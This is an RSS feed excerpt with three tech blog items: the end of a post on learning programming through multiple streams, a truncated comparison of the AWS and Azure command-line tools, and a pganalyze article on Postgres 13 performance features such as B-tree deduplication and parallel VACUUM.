    </span></p><p>Undoubtedly, solving problems is essential in order to get better at problem-solving. You’ve got to do the thing you want to get better at.</p><p>But we can’t discount other forms of knowledge that can accelerate your learning, like getting feedback and studying the code of others who've solved the same problem.</p><p>MSL forces you to apply your knowledge in different ways. Solving a problem in Python and then JavaScript forces me to think differently—even if it’s the same problem. It’s a reason why I’m a huge advocate for solving math problems as well.</p><p>The challenge becomes making what are typically conceived of as passive forms of knowledge active.</p><h2>Make It Active</h2><p>A cornerstone of MSL is to make the streams of learning active, and for good reason: you’ll remember it better.</p><p>Take feedback, for example. I aim to get feedback in real-time (which can easily be done via video conferencing in today’s remote-working world), instead of relying on written comments from a pull request. This makes the process active.</p><p>Reading through comments is passive, whereas real-time conversations force you to be mentally engaged by thinking on the fly, asking follow-up questions, and responding to the information at hand.</p><p>Then, put what you learn into action.</p><p>I once got feedback from a programmer who said I needed to <a href="https://amymhaddad.com/improve-your-code-by-writing-better-variable-names.mdx">write better variable names</a>. So I read about them in the book <em>Code Complete</em>, and made a “variable name” checklist. It hangs on the wall in front of my desk. Now there’s no excuse: writing variable names is constantly on my mind.</p><p>Or consider reading technical books. At first blush, this also sounds like a passive activity.</p><p>But there are ways to make it active. For one, “<a href="https://amymhaddad.com/four-ways-to-learn-programming-topics">spot check</a>” your learning: after you read a short section, stop and summarize to yourself what you just learned.</p><p>Another is to focus on one topic that you read about and apply it in your daily work. I type notes in Evernote for each technical book I read. To get better at writing tests, for example, I pull up my notes about test-driven development so I’m reminded to put my knowledge into action.</p><p>MSL is not a hack. It’s not a quick fix. Learning and building skills still take time and a lot of work.</p><p>But given my experience with both the siloed approach to learning and MSL, I can tell you first-hand that the latter is far superior of the two.</p><p>This is not only because MSL is more effective. But the variety also makes the learning process more enjoyable. And there’s something to be said for that. After all, learning to program isn’t a one-time thing. It’s a <a href="https://amymhaddad.com/learning-to-program-is-a-lifelong-pursuit">lifetime pursuit</a>. Enjoy the journey.</p><p><a href="https://amymhaddad.com/"><br>← back to all posts</a></p></div></div></div>]]>
            </description>
            <link>https://amymhaddad.com/how-to-accelerate-your-programming-knowledge-with-multiple-streams-of-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-24545001</guid>
            <pubDate>Mon, 21 Sep 2020 16:06:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let's Compare the CLI Experiences Offered by AWS, Azure, and Google Cloud]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544931">thread link</a>) | @sciurus
<br/>
September 21, 2020 | https://seroter.com/2020/09/15/lets-compare-the-cli-experiences-offered-by-aws-microsoft-azure-and-google-cloud-platform/ | <a href="https://web.archive.org/web/*/https://seroter.com/2020/09/15/lets-compare-the-cli-experiences-offered-by-aws-microsoft-azure-and-google-cloud-platform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8390" itemscope="itemscope" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">

	<!-- .entry-header-wrapper -->

	<div itemprop="text">
		
<p>Real developers use the CLI, or so I’m told. That probably explains why I mostly use the portal experiences of the major cloud providers. But judging from the portal experiences offered by most clouds, they prefer you use the CLI too. <strong>So let’s look at the CLIs.</strong></p>



<p>Specifically, I evaluated the cloud CLIs with an eye on five different areas:</p>



<ol><li><strong>API surface and patterns.</strong> How much of the cloud was exposed via CLI, and is there a consistent way to interact with each service?</li><li><strong>Authentication.</strong> How do users identify themselves to the CLI, and can you maintain different user profiles?</li><li><strong>Creating and viewing services.</strong> What does it feel like to provision instances, and then browse those provisioned instances?</li><li><strong>CLI sweeteners.</strong> Are there things the CLI offers to make using it more delightful?</li><li><strong>Utilities. </strong>Does the CLI offer additional tooling that helps developers build or test their software?</li></ol>



<p>Let’s dig in.</p>



<p><em>Disclaimer: I work for Google Cloud, so obviously I’ll have some biases. That said, I’ve used AWS for over a decade, was an Azure MVP for years, and can be mostly fair when comparing products and services. Please call out any mistakes I make!</em></p>







<p>You have a few ways to <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html">install the AWS CLI</a>. You can use a Docker image, or install directly on your machine. If you’re installing directly, you can download from AWS, or use your favorite package manager. AWS warns you that third party repos may not be up to date. I went ahead and installed the CLI on my Mac using <a href="https://formulae.brew.sh/formula/awscli#default">Homebrew</a>.</p>



<h3>API surface and patterns</h3>



<p>As you’d expect, the AWS CLI has <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/index.html">wide coverage</a>. Really wide. I think there’s an API in there to retrieve the name of Andy Jassy’s favorite jungle cat. The <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/index.html">EC2 commands</a> alone could fill a book. The documentation is comprehensive, with detailed summaries of parameters, and example invocations.</p>



<p>The command patterns are <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-usage-commandstructure.html">relatively consistent</a>, with some disparities between older services and newer ones. Most service commands look like:</p>



<pre>aws [service name] [action] [parameters]</pre>



<p>Most “actions” start with create, delete, describe, get, list, or update.</p>



<p>For example:</p>



<pre>aws elasticache create-cache-cluster --engine redis
aws kinesis describe-stream --stream-name seroter-stream
aws kinesis describe-stream --stream-name seroter-stream
aws qldb delete-ledger --name seroterledger
aws sqs list-queues</pre>



<p>S3 is one of the original AWS services, and <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/index.html">its API is different</a>. It uses commands like <code>cp</code>, <code>ls</code>, and <code>rm</code>. Some services have <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/elasticache/index.html">modify</a> commands, others use <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/eks/index.html">update</a>. For the most part, it’s intuitive, but I’d imagine most people can’t guess the commands.</p>



<h3>Authentication</h3>



<p>There isn’t one way to authenticate to the AWS CLI. You might <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sso.html">use SSO</a>, an <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sourcing-external.html">external file</a>, or inline <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html">access key and ID</a>, like I do below.</p>



<figure><img data-attachment-id="8394" data-permalink="https://seroter.com/2020-09-15-cli-01/" data-orig-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png" data-orig-size="600,166" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020.09.15-cli-01" data-image-description="" data-medium-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png?w=300" data-large-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png?w=600" src="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png?w=600" alt="" srcset="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png 600w, https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png?w=150 150w, https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-01.png?w=300 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>



<p>The CLI supports “<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-profiles">profiles</a>” which seems important when you may have different access to default values based on what you’re working on.</p>



<h3>Creating and viewing service instances</h3>



<p>By default, everything the CLI does occurs in the region of the active profile. You can override the default region by passing in a region flag to each command. See below that I created a new SQS queue without providing a region, and it dropped it into my default one (us-west-2). By explicitly passing in a target region, I created the second queue elsewhere.</p>



<figure><img data-attachment-id="8397" data-permalink="https://seroter.com/2020-09-15-cli-02/" data-orig-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png" data-orig-size="600,160" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020.09.15-cli-02" data-image-description="" data-medium-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png?w=300" data-large-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png?w=600" src="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png?w=600" alt="" srcset="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png 600w, https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png?w=150 150w, https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-02.png?w=300 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>



<p>The AWS Console shows you resources for a selected region. I don’t see obvious ways to get an all-up view. A few services, like S3, aren’t bound by region, and you see all resources at once. The CLI behaves the same. I can’t view all my SQS queues, or databases, or whatever, from around the world. I can “list” the items, region by region. Deletion behaves the same. I can’t delete the above SQS queue without providing a region flag, even though the URL is region-specific. </p>



<p>Overall, it’s fast and straightforward to provision, update, and list AWS services using the CLI. Just keep the region-by-region perspective in mind!</p>



<h3>CLI sweeteners</h3>



<p>The AWS CLI gives you control over the <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-usage-output.html">output format</a>. I set the default for my profile to json, but you can also do yaml, text, and table. You can toggle this on a request by request basis.</p>



<p>You can also take advantage of <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-completion.html">command completion</a>. This is handy, given how tricky it may be to guess the exact syntax of a command. Similarly, I really like you can be <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-usage-parameters-prompting.html">prompted for parameters</a>. Instead of guessing, or creating giant strings, you can go parameter by parameter in a guided manner.</p>



<p>The AWS CLI also offers select opportunities to interact with the resources themselves. I can <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sqs/send-message.html">send and receive</a> SQS messages. Or <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/dynamodb/put-item.html">put an item</a> directly into a DynamoDB table. There are a handful of services that let you create/update/delete data in the resource, but many are focused solely on the lifecycle of the resource itself.</p>



<p>Finally, I don’t see a way to self-update from within the CLI itself. It looks like you rely on your package manager or re-download to refresh it. If I’m wrong, tell me!</p>



<h3>Utilities</h3>



<p>It doesn’t look like the CLI ships with other tools that developers might use to build apps for AWS.</p>







<p>The Microsoft Azure CLI also has broad coverage and is <a href="https://docs.microsoft.com/en-us/cli/azure/?view=azure-cli-latest">well documented</a>. There’s no shortage of examples, and it clearly explains how to use each command.</p>



<p>Like AWS, Microsoft offers their <a href="https://docs.microsoft.com/en-us/cli/azure/run-azure-cli-docker?view=azure-cli-latest">CLI in a Docker image</a>. They also offer <a href="https://docs.microsoft.com/en-us/cli/azure/install-azure-cli?view=azure-cli-latest">direct downloads</a>, or access via a package manager. I grabbed mine from <a href="https://formulae.brew.sh/formula/azure-cli#default">Homebrew</a>.</p>



<h3>API surface and patterns</h3>



<p>The CLI supports <a href="https://docs.microsoft.com/en-us/cli/azure/install-azure-cli?view=azure-cli-latest">almost every major Azure service.</a> Some, like Logic Apps or Blockchain, only show up in their experimental sandbox. </p>



<p>Commands follow a particular syntax:</p>



<pre>az [service name] [object] create | list | delete | update [parameters]</pre>



<p>Let’s look at a few examples:</p>



<pre>az ad app create --display-name my-ad-app
az cosmosdb list --resource-group group1
az postgres db show --name mydb --resource-group group1 --server-name myserver
az service bus queue delete --name myqueue --namespace-name mynamespace --resource-group group1</pre>



<p>I haven’t observed much inconsistency in the CLI commands. They all seem to follow the same basic patterns.</p>



<h3>Authentication</h3>



<p><a href="https://docs.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest#az_login">Logging into the CLI </a>is easy. You can simply do <code>az login</code> as I did below—this opens a browser window and has you sign into your Azure account to retrieve a token—or you can pass in credentials. Those credentials may be a username/password, service principal with a secret, or service principal with a client certificate.</p>



<figure><img data-attachment-id="8399" data-permalink="https://seroter.com/2020-09-15-cli-03/" data-orig-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png" data-orig-size="600,502" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020.09.15-cli-03" data-image-description="" data-medium-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png?w=300" data-large-file="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png?w=600" src="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png?w=600" alt="" srcset="https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png 600w, https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png?w=150 150w, https://seroter.files.wordpress.com/2020/09/2020.09.15-cli-03.png?w=300 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>



<p>Once you log in, you see all your Azure subscriptions. You can parse the JSON to see which one is active, and will be used as the default. If you wish to change the default, you can use <code>az account set --subscription [name]</code> to pick a different one. </p>



<p>There doesn’t appear to be a way to create different local profiles.</p>



<h3>Creating and viewing service instances</h3>



<p>It seems that most everything you create in Azure goes into a <a href="https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/overview">resource group</a>. While a resource group has a “location” property, that’s related to the metadata, not a restriction on what gets deployed into it. You can set a default resource group (<code>az configure --defaults group=[name]</code>) or provide the relevant input parameter on each request.</p>



<p>Unlike other clouds, <a href="https://levelup.gitconnected.com/aws-azure-gcp-resource-hierarchies-25b829127511">Azure has a lot of nesting</a>. You have a root account, then a subscription, and then a resource group. And most resources also have parent-child relationships you must define before you can actually build the thing you want. </p>



<p>For example, if you want a service bus queue, you first create a <a href="https://docs.microsoft.com/en-us/cli/azure/servicebus/namespace?view=azure-cli-latest">namespace</a>. You can’t create both at the same time. It’s two calls. Want a storage blob to upload videos into? Create a <a href="https://docs.microsoft.com/en-us/cli/azure/storage/account?view=azure-cli-latest">storage account</a> first. A web application to run your .NET app? Provision a <a href="https://docs.microsoft.com/en-us/cli/azure/appservice/plan?view=azure-cli-latest">plan</a>. Serverless function? Create a plan. This doesn’t apply to everything, but just be aware that there are often multiple steps involved.</p>



<p>The creation activity itself is fairly simple. Here are commands to create Service Bus namespace and then a queue</p>



<pre>az servicebus namespace create --resource-group mydemos --name seroter-demos --location westus
az servicebus queue create --resource-group mydemos --namespace-name seroter-demos --name myqueue</pre>



<p>Like with AWS, some Azure assets get grouped by region. With Service Bus, namespaces are associated to a geo. I don’t see a way to query all queues, regardless of region. But for the many that aren’t, you get a view of all resources across the globe. After I created a couple Redis caches in my resource group, a simple <code>az redis list --resource-group mydemos</code> showed me caches in two different parts of the US.</p>



<p>Depending on how you use resource groups—maybe per app or per project, or even by team—just be aware that the CLI doesn’t retrieve results across resource groups. I’m not sure the best strategy for viewing subscription-wide resources other than the Azure Portal.</p>



<h3>CLI sweeteners</h3>



<p>The Azure CLI has some handy things to make it easier to use. </p>



<p>There’s a <a href="https://docs.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest#az_find">find function</a> for figuring out commands. There’s <a href="https://docs.microsoft.com/en-us/cli/azure/format-output-azure-cli?view=azure-cli-latest">output formatting</a> to json, tables, or yaml. You’ll also find a useful <a href="https://docs.microsoft.com/en-us/cli/azure/interactive-azure-cli?view=azure-cli-latest">interactive mode</a> to get auto-completion, command examples, and more. Finally, I like that the Azure CLI supports <a href="https://docs.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest#az_upgrade">self-upgrade</a>. Why leave the CLI if you don’t have to?</p>



<h3>Utilities</h3>



<p>I noticed a few things in this CLI that help developers. First, there’s an <a href="https://docs.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest#az_rest">az rest</a> command that lets you call Azure service endpoints with authentication headers taken care of for you. That’s a useful tool for calling secured endpoints.</p>



<p>Azure offers a wide array of <a href="https://docs.microsoft.com/en-us/cli/azure/azure-cli-extensions-overview?view=azure-cli-latest">extensions</a> to the CLI. These aren’t shipped as part of the CLI itself, but you can easily bolt them on. And you can create your own. This is a fluid list, but <code>az extension list-available</code> shows you what’s in the pool right now. As of this writing, there are extensions for preview AKS capabilities, managing Azure DevOps, working with DataBricks, using Azure LogicApps, querying the Azure Resource Graph, and more.</p>







<p>I’ve only recently started seriously using the GCP CLI. What’s struck me most about the <a href="https://cloud.google.com/sdk/gcloud">gcloud</a> tool is that it feels more like a system—dare I say, …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://seroter.com/2020/09/15/lets-compare-the-cli-experiences-offered-by-aws-microsoft-azure-and-google-cloud-platform/">https://seroter.com/2020/09/15/lets-compare-the-cli-experiences-offered-by-aws-microsoft-azure-and-google-cloud-platform/</a></em></p>]]>
            </description>
            <link>https://seroter.com/2020/09/15/lets-compare-the-cli-experiences-offered-by-aws-microsoft-azure-and-google-cloud-platform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544931</guid>
            <pubDate>Mon, 21 Sep 2020 16:00:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things we learned running Postgres 13]]>
            </title>
            <description>
<![CDATA[
Score 351 | Comments 48 (<a href="https://news.ycombinator.com/item?id=24544881">thread link</a>) | @lfittl
<br/>
September 21, 2020 | https://pganalyze.com/blog/postgres13-better-performance-monitoring-usability | <a href="https://web.archive.org/web/*/https://pganalyze.com/blog/postgres13-better-performance-monitoring-usability">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span>
      <a href="https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/aa440/postgres_13.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="postgres 13" title="Astronaut writing Postgres 13" src="https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/8c557/postgres_13.png" srcset="https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/4edbd/postgres_13.png 175w, https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/13ae7/postgres_13.png 350w, https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/8c557/postgres_13.png 700w, https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/e996b/postgres_13.png 1050w, https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/2cefc/postgres_13.png 1400w, https://pganalyze.com/static/c19e088b51f042e5749d96ace57df97b/aa440/postgres_13.png 1500w" sizes="(max-width: 700px) 100vw, 700px" loading="lazy">
  </a>
    </span>
</p>
<p>Postgres 13 is almost here. It's been in beta since May, and the general availability release is
coming any day. We've been following Postgres 13 closely here at pganalyze, and have been running
the beta in one of our staging environments for several months now.</p>
<p>There are no big new features in Postgres 13, but there are a lot of small but important incremental
improvements. Let's take a look.</p>

<h2 id="performance"><a href="#performance" aria-label="performance permalink"></a>Performance</h2>
<p>Postgres 13 performance improvements include both built-in optimizations and heuristics that will make
your database run better out of the box, as well as additional features to give you more flexibility
in optimizing your schema and queries.</p>
<h3 id="smaller-indexes-with-b-tree-deduplication"><a href="#smaller-indexes-with-b-tree-deduplication" aria-label="smaller indexes with b tree deduplication permalink"></a>Smaller Indexes with B-Tree Deduplication</h3>
<!-- -->

<svg xmlns:xl="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" xmlns:dc="http://purl.org/dc/elements/1.1/" version="1.1" viewBox="222 230.5 630.072 116" width="630.072" height="116">
  <defs>
    <font-face font-family="Avenir Next" font-size="16" panose1="2 11 5 3 2 2 2 2 2 4" units-per-em="1000" underline-position="-75" underline-thickness="50" slope="0" x-height="468" cap-height="708" ascent="1000" descent="-365.9973" font-weight="400">
      <font-face-src>
        <font-face-name name="AvenirNext-Regular"></font-face-name>
      </font-face-src>
    </font-face>
    <font-face font-family="Avenir Next" font-size="16" panose1="2 11 8 3 2 2 2 2 2 4" units-per-em="1000" underline-position="-75" underline-thickness="50" slope="0" x-height="498" cap-height="708" ascent="1000" descent="-365.9973" font-weight="700">
      <font-face-src>
        <font-face-name name="AvenirNext-Bold"></font-face-name>
      </font-face-src>
    </font-face>
  </defs>
  <metadata> Produced by OmniGraffle 7.17.2\n2020-09-20 19:29:10 +0000</metadata>
  <g id="Canvas_1" strokedasharray="none" stroke-opacity="1" stroke="none" fill="none" fill-opacity="1">
    <title>Canvas 1</title>
    <g id="Canvas_1_Layer_1">
      <title>Layer 1</title>
      <g id="Graphic_2">
        <rect x="232" y="240.5" width="250.5" height="39.5" fill="#d8d5df"></rect>
      </g>
      <g id="Graphic_3">
        <rect x="232" y="297" width="89.5" height="39.5" fill="#d8eef0"></rect>
      </g>
      <g id="Graphic_9">
        <text transform="translate(244.128 251.026)" fill="black">
          <tspan font-family="Avenir Next" font-size="16" font-weight="400" fill="black" x="0" y="16"></tspan>
        </text>
      </g>
      <g id="Graphic_10">
        <text transform="translate(244.128 309.013)" fill="black">
          <tspan font-family="Avenir Next" font-size="16" font-weight="400" fill="black" x="0" y="16"></tspan>
        </text>
      </g>
      <g id="Graphic_13">
        <text transform="translate(502 251.026)" fill="black">
          <tspan font-family="Avenir Next" font-size="16" font-weight="400" fill="black" x="0" y="16">deduplicate_items=off</tspan>
        </text>
      </g>
      <g id="Graphic_14">
        <text transform="translate(502 307.526)" fill="black">
          <tspan font-family="Avenir Next" font-size="16" font-weight="400" fill="black" x="0" y="16">deduplicate_items=on   </tspan>
          <tspan font-family="Avenir Next" font-size="16" font-weight="700" fill="black" y="16">(new in Postgres 13)</tspan>
        </text>
      </g>
    </g>
  </g>
</svg>
<p>Postgres 13 introduces a way for B-Tree indexes to <a href="https://www.postgresql.org/docs/13/btree-implementation.html#BTREE-DEDUPLICATION">avoid storing duplicate entries in some situations</a>.
In general, a B-Tree index consists of a tree of indexed values, with each leaf node pointing to a
particular row version. Because each leaf points to one row version, if you are indexing non-unique
values, those values need to be repeated.</p>
<p>The de-duplication mechanism avoids that by having a leaf node point to several row versions if possible,
which leads to smaller indexes.</p>
<p>Here is an example from our own pganalyze application schema: We have a <code>queries</code> table to
track all the queries we monitor, and a <code>database_id</code> field to track which database they belong to. We
index <code>database_id</code> (so we can quickly fetch queries for a specific database), and because each database
typically has more than one query, there is a lot of duplication in this index.</p>
<p>New B-Tree indexes in Postgres 13 use the deduplication feature by default, but if for some reason,
you need to turn it off, you can control it with the <code>deduplicate_items</code> storage parameter. Here we
create the same index in two different ways, with deduplication explicitly on and off (though again,
you don't need to specify <code>on</code>—this is the default):</p>
<div data-language="sql"><pre><code><span>CREATE</span> <span>INDEX</span> CONCURRENTLY queries_db_id_idx_no_dedup <span>ON</span> queries<span>(</span>database_id<span>)</span>
<span>WITH</span> <span>(</span>deduplicate_items<span>=</span><span>off</span><span>)</span><span>;</span>

<span>CREATE</span> <span>INDEX</span> CONCURRENTLY queries_db_id_idx_yes_dedup <span>ON</span> queries<span>(</span>database_id<span>)</span>
<span>WITH</span> <span>(</span>deduplicate_items<span>=</span><span>on</span><span>)</span><span>;</span>

<span>SELECT</span> relname<span>,</span> pg_size_pretty<span>(</span>pg_relation_size<span>(</span>oid<span>)</span><span>)</span> <span>FROM</span> pg_class
<span>WHERE</span> relname <span>IN</span> <span>(</span><span>'queries_db_id_idx_no_dedup'</span><span>,</span> <span>'queries_db_id_idx_yes_dedup'</span><span>)</span><span>;</span></code></pre></div>
<div data-language="text"><pre><code>           relname           | pg_size_pretty 
-----------------------------+----------------
 queries_db_id_idx_no_dedup  | 218 MB
 queries_db_id_idx_yes_dedup | 67 MB
(2 rows)</code></pre></div>
<p>With deduplication, the new index is more than <strong>three times smaller</strong>! Smaller indexes are faster to load
from disk, and take up less space in memory, meaning there's more room for your data.</p>
<p>One interesting note here is that the index entries point to row <em>versions</em> (as in, a row the way it
exists in one specific <a href="https://www.postgresql.org/docs/13/mvcc.html">MVCC</a> state), not rows themselves,
so this feature <strong>can improve index size even for unique indexes</strong>, where one would not expect any duplication
to occur.</p>
<p>Note that deduplication is not possible in all cases (see above link for details), and that you
will need to reindex before you can take advantage of it if upgrading via <code>pg_upgrade</code>.</p>
<h3 id="extended-statistics-improvements-in-postgres-13"><a href="#extended-statistics-improvements-in-postgres-13" aria-label="extended statistics improvements in postgres 13 permalink"></a>Extended Statistics Improvements in Postgres 13</h3>
<p>Postgres 10 introduced the concept of <a href="https://www.postgresql.org/docs/13/planner-stats.html#PLANNER-STATS-EXTENDED">extended statistics</a>. Postgres keeps some statistics about the "shape" of your data to ensure it can plan queries efficiently,
but the statistics kept by default cannot track things like inter-column dependencies. Extended statistics
were introduced to address that: These are database objects (like indexes) that you create manually with
<code>CREATE STATISTICS</code> to give the query planner more information for more specific situations. These would be
expensive for Postgres to determine automatically, but armed with an understanding of the semantics of your
schema, you can provide that additional info. Used carefully, this can lead to
<a href="https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61">massive performance improvements</a>.</p>
<p>Postgres 13 brings a number of small but important improvements to extended statistics, including
support for using them with <code>OR</code> clauses and in <code>IN</code>/<code>ANY</code> constant lists, allowing consideration
of multiple extended statistics objects in planning a query, and support for
<a href="https://www.postgresql.org/docs/13/sql-alterstatistics.html">setting a statistics target</a> for
extended statistics:</p>
<div data-language="sql"><pre><code><span>ALTER</span> <span>STATISTICS</span> table_stx <span>SET</span> <span>STATISTICS</span> <span>1000</span><span>;</span></code></pre></div>
<p>Like with the regular statistics target, this is a trade-off between additional planning time (and longer <code>ANALYZE</code> runs), versus having more precise plans. We recommend using this in a targeted manner using EXPLAIN plans to confirm plan changes.</p>
<h3 id="parallel-vacuum--better-support-for-append-only-workloads"><a href="#parallel-vacuum--better-support-for-append-only-workloads" aria-label="parallel vacuum  better support for append only workloads permalink"></a>Parallel VACUUM &amp; Better Support for Append-only Workloads</h3>
<p>Postgres multi-version concurrency control means you need to run <code>VACUUM</code> regularly (usually you can rely
on the autovacuum process, though it may need some tuning). In Postgres 13, one notable improvement is
that multiple indexes for a single table can be vacuumed in parallel. This can lead to big performance
improvements in <code>VACUUM</code> work. Parallel <code>VACUUM</code> is the default and can be controlled with the <code>PARALLEL</code> option:</p>
<div data-language="sql"><pre><code>VACUUM <span>(</span>PARALLEL <span>2</span><span>,</span> VERBOSE<span>)</span> queries<span>;</span></code></pre></div>
<div data-language="text"><pre><code>INFO:  vacuuming "public.queries"
INFO:  launched 2 parallel vacuum workers for index vacuuming (planned: 2)
INFO:  scanned index "index_queries_on_database_id" to remove 1403418 row versions by parallel vacuum worker
DETAIL:  CPU: user: 0.98 s, system: 0.15 s, elapsed: 2.37 s
INFO:  scanned index "index_queries_on_last_occurred_at" to remove 1403418 row versions by parallel vacuum worker
DETAIL:  CPU: user: 0.88 s, system: 0.27 s, elapsed: 2.60 s
...</code></pre></div>
<p>Parallel VACUUM occurs when the following is true:</p>
<ul>
<li>Sufficient parallel workers are available, based on the system-wide limit set by <a href="https://www.postgresql.org/docs/13/runtime-config-resource.html#GUC-MAX-PARALLEL-WORKERS-MAINTENANCE"><code>max_parallel_maintenance_workers</code></a> (defaults to 2)</li>
<li>There are multiple indexes on the table (one index can be processed by one worker at a time)</li>
<li>Index types support it (all built-in index types support parallelism to some extent)</li>
<li>The indexes are large enough to exceed <a href="https://www.postgresql.org/docs/13/runtime-config-query.html#GUC-MIN-PARALLEL-INDEX-SCAN-SIZE"><code>min_parallel_index_scan_size</code></a> (defaults to 512 kB)</li>
</ul>
<p>Be aware that <strong>parallel VACUUM is currently not supported for autovacuum.</strong> This new feature is intended for use in manual VACUUM runs that need to complete quickly, such as when insufficient autovacuum tuning has lead to an imminent TXID wraparound, and you need to intervene to fix it.</p>
<p>On that note, an important <code>autovacuum</code> improvement in Postgres 13 is that the autovacuum background process can now be triggered by <code>INSERT</code> statements for append-only tables. The main purpose of VACUUM is to clean up old versions of updated and deleted rows, but it is also essential to set pages as all-visible for MVCC bookkeeping. All-visible pages allow index-only scans to avoid checking visibility status row-by-row, making them faster.</p>
<p>We make extensive use of append-only tables at pganalyze for our timeseries data, and this improvement will make our lives considerably easier, avoiding the occasional manual VACUUM run on these tables. This new behavior can be controlled by the <code>autovacuum_vacuum_insert_threshold</code> and <code>autovacuum_vacuum_insert_scale_factor</code> variables.</p>
<h3 id="incremental-sorting"><a href="#incremental-sorting" aria-label="incremental sorting permalink"></a>Incremental Sorting</h3>
<p>Sorting data is a common database task, and Postgres has a number of features to avoid unnecessary work
here. For example, if you have a B-Tree index on a column, and you query your table ordered by that column,
it can just scan that index in order to get sorted data.</p>
<p>In Postgres 13, this is improved to handle partially sorted data. If you have an index on <code>(a, b)</code> (or
the data is already sorted by <code>(a, b)</code> for another reason), and you issue a query to order by <code>(a, b, c)</code>,
Postgres understands that the input data is already partially sorted, and can avoid re-sorting the whole
dataset. This is especially useful if you have a <code>LIMIT</code> in your query, since this can avoid even more
work.</p>
